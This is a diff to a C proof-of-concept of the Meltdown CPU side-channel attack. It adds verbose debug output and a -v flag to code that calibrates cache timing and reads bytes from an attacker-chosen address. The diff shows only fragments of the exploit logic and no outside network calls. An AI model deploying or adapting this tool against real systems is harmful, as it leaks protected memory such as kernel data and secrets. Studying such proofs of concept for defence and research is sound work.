@@ -47,6 +47,13 @@
 #include <unistd.h>
 
 /*
+ * Debugging
+ */
+static int verbose;
+#define VERBOSEF(...) do { if (verbose > 0) fprintf(stderr, __VA_ARGS__); } while (0)
+#define VERYVERBOSEF(...) do { if (verbose > 1) fprintf(stderr, __VA_ARGS__); } while (0)
+
+/*
  * Assembler functions
  */
 void clflush(const void *addr);
@@ -135,7 +142,7 @@ calibrate(void)
 	uint64_t meas, min, max, sum;
 	unsigned int i;
 
-	warnx("calibrating...");
+	VERBOSEF("calibrating...\n");
 
 	/* compute average latency of "cold" access */
 	min = UINT64_MAX;
@@ -154,7 +161,7 @@ calibrate(void)
 	sum -= min;
 	sum -= max;
 	avg_cold = sum / CAL_ROUNDS;
-	warnx("average cold read: %llu", (unsigned long long)avg_cold);
+	VERBOSEF("average cold read: %llu\n", (unsigned long long)avg_cold);
 
 	/* compute average latency of "hot" access */
 	meas = timed_read(probe);
@@ -173,7 +180,7 @@ calibrate(void)
 	sum -= min;
 	sum -= max;
 	avg_hot = sum / CAL_ROUNDS;
-	warnx("average hot read: %llu", (unsigned long long)avg_hot);
+	VERBOSEF("average hot read: %llu\n", (unsigned long long)avg_hot);
 
 	/* set decision threshold to sqrt(hot * cold) */
 	if (avg_hot >= avg_cold)
@@ -181,7 +188,7 @@ calibrate(void)
 	for (threshold = avg_hot; threshold <= avg_cold; threshold++)
 		if (threshold * threshold >= avg_hot * avg_cold)
 			break;
-	warnx("threshold: %llu", (unsigned long long)threshold);
+	VERBOSEF("threshold: %llu\n", (unsigned long long)threshold);
 }
 
 /*
@@ -243,7 +250,7 @@ meltdown(void)
 	int signo;
 	uint8_t b;
 
-	warnx("reading %zu bytes from %p with %u rounds",
+	VERBOSEF("reading %zu bytes from %p with %u rounds\n",
 	    atk_len, atk_addr, atk_rounds);
 	sigsegv = signal(SIGSEGV, sighandler);
 	for (i = 0; i < atk_len; ++i) {
@@ -266,9 +273,14 @@ meltdown(void)
 			}
 		}
 		/* retain the most frequent value */
-		for (b = 0, v = 0; v < PROBE_NLINES; ++v)
+		VERYVERBOSEF("%04x |", i);
+		for (b = 0, v = 0; v < PROBE_NLINES; ++v) {
+			if (hist[v] > 0)
+				VERYVERBOSEF(" [%02x] = %u", v, hist[v]);
 			if (hist[v] > hist[b])
 				b = v;
+		}
+		VERYVERBOSEF(" | %u\n", b);
 		line[i % 16] = b;
 		/* output 16 bytes at a time */
 		if (i % 16 == 15)
@@ -287,7 +299,7 @@ static void
 usage(void)
 {
 
-	fprintf(stderr, "usage: meltdown [-a addr | -s] [-l len] [-n rounds]\n");
+	fprintf(stderr, "usage: meltdown [-v] [-a addr | -s] [-l len] [-n rounds]\n");
 	exit(1);
 }
 
@@ -299,7 +311,7 @@ main(int argc, char *argv[])
 	unsigned int i;
 	int opt;
 
-	while ((opt = getopt(argc, argv, "a:l:n:s")) != -1)
+	while ((opt = getopt(argc, argv, "a:l:n:sv")) != -1)
 		switch (opt) {
 		case 'a':
 			if (atk_addr != 0)
@@ -335,6 +347,9 @@ main(int argc, char *argv[])
 			if (atk_addr != 0)
 				usage();
 			atk_addr = selftest;
+			break;
+		case 'v':
+			verbose++;
 			break;
 		default:
 			usage();
